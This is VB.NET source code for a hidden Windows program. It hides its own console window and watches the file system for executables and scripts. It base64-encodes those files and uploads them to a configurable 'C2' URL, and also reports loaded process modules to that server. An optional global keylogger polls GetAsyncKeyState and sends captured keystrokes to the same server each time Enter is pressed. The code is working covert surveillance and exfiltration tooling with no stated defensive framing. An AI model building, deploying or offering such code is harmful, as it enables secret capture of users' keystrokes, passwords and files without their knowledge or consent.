Imports System.Security.Principal
Imports System.IO
Imports System.Threading
Imports System.Security.Cryptography
Imports System.Net
Imports System.Text
Imports System.Windows.Forms 'add reference
Imports System.Timers
Imports System.Diagnostics


Module Module1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short

    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr   'get handle window
    Private Const SW_HIDE As Integer = 0


    Public c As New Configurazione
    Public arrayEst As String()
    Public tot_sec As Integer = 0




    Sub Main()

        ' configure HKLM/SOFTWARE/Microsoft/Windows/Run  <---- + stato salt per verifica


        Dim hWndConsole As IntPtr
        hWndConsole = GetConsoleWindow()
        ShowWindow(hWndConsole, SW_HIDE)



        If check_if_running() Then
            End
        End If


        Try
            log_locale("[+] Start...")
            carica_configurazione()
            log_locale("[+] Configuration loaded")
        Catch
            log_locale("[+] Error loading configuration file")
            End
        End Try


        clean_temp()


        Dim aTimer As New Timers.Timer
        aTimer.Interval = 1000 '1 second
        AddHandler aTimer.Elapsed, AddressOf tick
        aTimer.Start()

        
        avvia_monitoring()
    
    
    
        If c.keylogger Then
            avvia_keylogger()
        Else
            While True 'no stop main
                Application.DoEvents()
            End While
        End If

        
        'avvia_process_monitoring()





    End Sub


    Function check_if_running() As Boolean
        Dim p() As Process
        'check_if_running = False
        p = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)
        If p.Count > 1 Then
            check_if_running = True
        Else
            check_if_running = False
        End If
    End Function



    Sub log_locale(e As String)
        Dim f As New StreamWriter(verifica_path(Directory.GetCurrentDirectory) & "error.log", True)
        f.WriteLine(Now() & " - " & e)
        f.Close()
    End Sub

    Sub carica_configurazione()

        Dim s As String = ""
        If File.Exists(verifica_path(Directory.GetCurrentDirectory) & "config.txt") Then
            Dim f As New StreamReader(verifica_path(Directory.GetCurrentDirectory) & "config.txt")


            s = f.ReadLine()
            s = f.ReadLine()
            c.path_monitor = verifica_path(s)

            s = f.ReadLine()
            s = f.ReadLine()
            arrayEst = s.Split(";")


            s = f.ReadLine()
            s = f.ReadLine()
            c.path_escl_monitoring = verifica_path(s)

            s = f.ReadLine()
            s = f.ReadLine()
            c.temp_path = verifica_path(s)

            s = f.ReadLine()
            s = f.ReadLine()
            If (s = "1") Then
                c.switch_monitor_path = True
            Else
                c.switch_monitor_path = False
            End If

            s = f.ReadLine()
            s = f.ReadLine()
            If (s = "1") Then
                c.path_recursive = True
            Else
                c.path_recursive = False
            End If

            s = f.ReadLine()
            s = f.ReadLine()
            If (s = "1") Then
                c.switch_del_error = True
            Else
                c.switch_del_error = False
            End If

            s = f.ReadLine()
            s = f.ReadLine()
            c.url_c2 = s

            s = f.ReadLine()
            s = f.ReadLine()
            If (s = "1") Then
                c.keylogger = True
            Else
                c.keylogger = False
            End If

            s = f.ReadLine()
            s = f.ReadLine()
            c.log_name = s

            s = f.ReadLine()
            s = f.ReadLine()
            c.timer_interval = s

            f.Close()

        Else
            c.path_monitor = "c:\"

            s = ".ps1;.exe;.bat;.vbs;.dll;.cmd;.com;.psm1;.psd1;.py;.hta"
            arrayEst = s.Split(";")

            c.ext_monitoring = ""
            c.path_escl_monitoring = "c:\windows\"    '<-------test
            c.temp_path = "c:\temp\"


            c.switch_monitor_path = False
            c.path_recursive = True
            c.switch_del_error = False
            c.url_c2 = "#"
            c.keylogger = False
            c.log_name = "C2 Control"
            c.timer_interval = 600 ' 10 minutes
        End If
    End Sub


    Function verifica_ext(e As String) As Boolean
        verifica_ext = False
        For i = 0 To arrayEst.Length - 1
            If UCase(e) = UCase(arrayEst(i)) Then
                verifica_ext = True
                Exit For
            End If
        Next

    End Function

    Private Sub onException(sender As Object, e As Runtime.ExceptionServices.FirstChanceExceptionEventArgs)
        log_locale("[+] Exception: " & e.Exception.Message.ToString)
    End Sub
    Private Sub gestError(sender As Object, e As ErrorEventArgs)
        log_locale("[+] Exception: " & e.GetException.Message.ToString)
    End Sub





    Private Sub tick(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)
        tot_sec += 1
        If tot_sec > c.timer_interval Then
            tot_sec = 0
            process_monitoring()
        End If

    End Sub

    Sub avvia_process_monitoring()
        Dim td As Thread
        td = New Thread(AddressOf process_monitoring) 'il processo non è in loop 
        td.Start()
        'td.Join()
    End Sub

    Sub process_monitoring()

        Dim p As String = ""
        Dim m As String = ""
        Dim h As String = ""
        For Each proc As Process In Process.GetProcesses()
            p = proc.ProcessName
            Try
                For Each modl As ProcessModule In proc.Modules
                    m = WebUtility.HtmlEncode(modl.FileName.Replace("\", "\\"))
                    h = get_md5(modl.FileName)
                    invia_to_c2(p, "", h, m, "", "P")   'add pid and process status ex. ended
                Next
            Catch
                '
            End Try
        Next

        '---------------------------------------
    End Sub


    Sub avvia_monitoring()
        Dim td As Thread
        td = New Thread(AddressOf monitoring)
        td.Start()
        'td.Join()
    End Sub

    Sub monitoring()

        AddHandler AppDomain.CurrentDomain.ProcessExit, AddressOf OnClose
        AddHandler AppDomain.CurrentDomain.FirstChanceException, AddressOf onException

        Dim w = New FileSystemWatcher
        w.Path = c.path_monitor
        w.Filter = "*.*"

        Dim hostname As String = My.Computer.Name
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)

        Dim isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator)
        If isAdmin Then
            log_locale("[+] The current user has administrator permissions")
        Else
            log_locale("[+] The current user does not have administrator permissions")
            End
        End If

        If c.path_recursive Then
            w.IncludeSubdirectories = True
        Else
            w.IncludeSubdirectories = False
        End If
        w.NotifyFilter = NotifyFilters.FileName Or NotifyFilters.LastWrite

        AddHandler w.Created, AddressOf OnCreated
        AddHandler w.Changed, AddressOf OnChanged
        AddHandler w.Deleted, AddressOf OnDeleted
        AddHandler w.Renamed, AddressOf onRenamed
        AddHandler w.Error, AddressOf gestError


        ' start monitoring
        w.EnableRaisingEvents = True

        '************************************************************************************
        'Console.WriteLine("[+] Waiting for file creation...")
        'Console.ReadLine()
        '************************************************************************************

        'w.EnableRaisingEvents = False



    End Sub




    Sub OnClose(sender As Object, e As EventArgs)

        Dim files() As String = Directory.GetFiles(c.temp_path)
        For Each f As String In files
            If f.Contains("temp-") Then File.Delete(f)
        Next

        Try
            If c.switch_del_error Then
                File.Delete(verifica_path(Directory.GetCurrentDirectory) & "error.log")
            Else
                log_locale("[+] Stopping")
            End If
        Catch ex As Exception

        End Try

    End Sub



    Sub clean_temp()
        Try
            Dim files() As String = Directory.GetFiles(c.temp_path)
            For Each f As String In files
                If f.Contains("temp-") Then File.Delete(f)
            Next
        Catch ex As Exception

        End Try
        log_locale("[+] Path temp cleaned")
    End Sub

    Private Sub onRenamed(sender As Object, e As RenamedEventArgs)

        Dim ext As New FileInfo(e.FullPath)
        If verifica_ext(ext.Extension) Then


            If c.switch_monitor_path Then
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 1)
                End If
            Else
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 1)
                End If
            End If

        End If
    End Sub

    Private Sub OnCreated(sender As Object, e As FileSystemEventArgs)


        Dim ext As New FileInfo(e.FullPath)
        If verifica_ext(ext.Extension) Then
            If c.switch_monitor_path Then
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 2)
                End If
            Else
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 2)
                End If
            End If
        End If

    End Sub

    Private Sub OnChanged(sender As Object, e As FileSystemEventArgs)
        Dim ext As New FileInfo(e.FullPath)
        If verifica_ext(ext.Extension) Then


            If c.switch_monitor_path Then
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 3)
                End If
            Else
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                Else
                    salva_file(e.FullPath, 3)
                End If
            End If

        End If
    End Sub

    Private Sub OnDeleted(sender As Object, e As FileSystemEventArgs)

        Dim ext As New FileInfo(e.FullPath)
        If verifica_ext(ext.Extension) Then


            If c.switch_monitor_path Then
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                    '
                Else
                    log_locale("[+] File deleted: " & e.FullPath)
                    scrivi_evento("File: " & e.FullPath, 469)
                End If
            Else
                If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
                    log_locale("[+] Excluding files: " & e.FullPath)
                    '
                Else
                    log_locale("[+] File deleted: " & e.FullPath)
                    scrivi_evento("File: " & e.FullPath, 469)
                End If
            End If

        End If
    End Sub

    Sub salva_file(f As String, id As Integer)

        If verifica_free(f) Then
            Dim rand As New Random()
            'lock() unlock()

            Dim nome_file As String = "temp-" & rand.Next() & ".dat"
            While File.Exists(nome_file)
                nome_file = "temp-" & rand.Next() & ".dat"
            End While

            Try
                My.Computer.FileSystem.CopyFile(f, c.temp_path & nome_file, overwrite:=True)
            Catch
                If verifica_free(c.temp_path & nome_file) Then
                    My.Computer.FileSystem.CopyFile(f, c.temp_path & nome_file, overwrite:=True)
                End If
            Finally
                Dim md5hash As String = get_md5(f)
                Dim base64text As String = get_base64_from_file(f)

                Select Case id
                    Case 1
                        scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 269)
                        invia_to_c2(base64text, 269, md5hash, f, "", "L")
                    Case 2
                        scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 169)
                        invia_to_c2(base64text, 169, md5hash, f, "", "L")
                    Case 3
                        scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 369)
                        invia_to_c2(base64text, 369, md5hash, f, "", "L")
                End Select
            End Try

            elimina_file(c.temp_path & nome_file)


        End If

    End Sub

    Function get_base64_from_file(f As String) As String
        Try
            get_base64_from_file = Convert.ToBase64String(System.IO.File.ReadAllBytes(f))
        Catch
            get_base64_from_file = "LQ==" ' -
        End Try
    End Function
    Function get_base64_from_string(s As String) As String
        Try
            get_base64_from_string = Convert.ToBase64String(Encoding.ASCII.GetBytes(s))
        Catch
            get_base64_from_string = "LQ==" ' -
        End Try
    End Function
    Function get_md5(f As String) As String
        Dim MD5 = System.Security.Cryptography.MD5.Create
        Dim Hash As Byte()
        Dim sb As New System.Text.StringBuilder
        Try
            Using st As New IO.FileStream(f, IO.FileMode.Open, IO.FileAccess.Read, IO.FileShare.Read)
                Hash = MD5.ComputeHash(st)
            End Using

            For Each b In Hash
                sb.Append(b.ToString("X2"))
            Next
            get_md5 = sb.ToString
        Catch
            get_md5 = "-"
        End Try

    End Function

    Function verifica_free(f As String) As Boolean
        verifica_free = False
        While True
            Try
                Dim stream As New StreamReader(f)
                stream.Close()
                verifica_free = True
                Exit While
            Catch
                Thread.Sleep(1000)
            End Try
        End While


    End Function

    Sub elimina_file(f As String)
        If verifica_free(f) Then My.Computer.FileSystem.DeleteFile(f)
    End Sub

    Sub scrivi_evento(messaggio As String, idlog As Integer)

        If Len(messaggio) > 0 Then
            Dim sourceName As String = c.log_name
            Dim logName As String = "LogC2"
            Try
                If Not EventLog.SourceExists(sourceName) Then
                    EventLog.CreateEventSource(sourceName, logName)
                    log_locale("[+] Log source created...")
                Else
                    log_locale("[+] Log source updated...")
                End If

                Dim log As New EventLog()
                log.Source = sourceName
                log.WriteEntry(messaggio, EventLogEntryType.Information, idlog)
            Catch
                log_locale("[+] Unable to handle events...")
            End Try
        End If

    End Sub

    Function verifica_path(ByVal p As String) As String
        verifica_path = ""
        If Mid(p, Len(p), 1) = "\" Then
            verifica_path = p
        Else
            verifica_path = p & "\"
        End If
    End Function


    Sub invia_to_c2(b As String, i As String, h As String, f As String, k As String, func As String)
        'b as base64 / other strings
        'i as id log
        'h as hash
        'f as file name
        'k as keylog buffer / other strings
        If Not Mid(c.url_c2, 1, 1) = "#" Then


            Try
                Dim request As WebRequest
                Dim postData As String = ""

                Select Case func
                    Case "L" 'upload log
                        request = WebRequest.Create(c.url_c2 & "collect.php")
                        postData = "id_log=" & i & "&b64=" & b & "&hash=" & h & "&file_name=" & WebUtility.HtmlEncode(f.Replace("\", "\\"))
                    Case "K" 'upload keylogger
                        request = WebRequest.Create(c.url_c2 & "collectk.php")
                        postData = "keylog_buffer=" & k & "&hostname=" & My.Computer.Name 'base64 encode
                    Case "P"
                        'b = process name
                        'i = ""
                        'h = hash
                        'f = module name - dll
                        'k = ""
                        request = WebRequest.Create(c.url_c2 & "collectp.php")
                        postData = "hostname=" & My.Computer.Name & "&pname=" & b & "&hash=" & h & "&file_name=" & f
                    Case Else
                        Exit Sub
                End Select

                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)

                request.Method = "POST"
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length

                Using outStream As Stream = request.GetRequestStream()
                    outStream.Write(byteArray, 0, byteArray.Length)
                End Using

                Dim response As WebResponse = request.GetResponse()
                Using inStream As Stream = response.GetResponseStream()
                    Dim reader As New StreamReader(inStream)
                    Dim responseFromServer As String = reader.ReadToEnd()


                    log_locale("[+] Data sent to C2: " & responseFromServer)
                End Using
                response.Close()

            Catch ex As Exception
                log_locale("[+] Error sending to C2")
            End Try

        End If

    End Sub


    '------------------------------------------------------------------------------------------

    Sub avvia_keylogger()
        Dim td As Thread
        td = New Thread(AddressOf keylogger)
        td.Start()
        'td.Join()
    End Sub
    Sub keylogger()

        Dim k As New Keys 'system.windows.forms
        While True

#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            If GetAsyncKeyState(k.Return) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[Enter]")
                keylogger_send_c2() 'when ir press enter
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.Space) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[Space]")
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.Back) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[Backspace]")
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.LShiftKey) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[LShift]")
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.RShiftKey) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[RShift]")
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.LControlKey) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[LCTRL]")
#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
            ElseIf GetAsyncKeyState(k.RControlKey) = -32767 Then
#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                keylogger_scrivi("[RCTRL]")
            Else
                For i = 33 To 127
                    If GetAsyncKeyState(i) = -32767 Then keylogger_scrivi(Chr(i))    '<----- verify ucase and lcase, key -
                Next i
            End If
        End While

    End Sub

    Sub keylogger_scrivi(b As String)
        Dim f As New StreamWriter(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt", append:=True)
        f.Write(b)
        f.Close()
    End Sub

    Sub keylogger_send_c2()
        'send to c2 only when return is pressed - update on db
        If verifica_free(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt") Then
            Dim f As New StreamReader(verifica_path(Directory.GetCurrentDirectory) & "keylog_temp.txt")
            Dim s As String = f.ReadToEnd
            f.Close()
            Dim k As String = get_base64_from_string(s)
            'Dim k As String = f.ReadToEnd

            invia_to_c2("", 0, "", "", k, "K")
        End If


    End Sub


    '------------------------------------------------------------------------------------------
End Module

